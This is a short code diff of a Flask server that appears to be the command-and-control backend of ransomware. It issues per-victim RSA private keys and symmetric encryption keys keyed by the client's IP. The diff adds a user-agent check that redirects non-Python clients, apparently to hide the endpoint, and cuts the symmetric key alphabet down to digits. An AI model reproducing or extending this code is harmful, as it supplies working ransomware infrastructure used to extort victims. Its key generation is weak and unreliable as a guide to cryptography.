@@ -43,6 +43,8 @@ def generate_cookie(username):
 app = Flask(__name__)
 @app.route("/")
 def index():
+    if not "Python" in str(request.user_agent):
+        return redirect("/admin/",code=302)
     if request.remote_addr not in ransom_keys.keys():
         print("[+] Sending New")
         private_key = rsa.generate_private_key(
@@ -82,7 +84,7 @@ def decrypt():
 
 @app.route("/get_sym")
 def symetric():
-    liste_char = [i for i in "AZERTYUIOPQSDFGHJKLMWXCVBNazertyuiopqsdfghjklmwxcvbn$%§?*µ@#&1234567890"]
+    liste_char = [i for i in "1234567890"]
     key = "".join([random.choice(liste_char) for _ in range(24)])
     global symetric_keys
     symetric_keys[request.remote_addr]=key
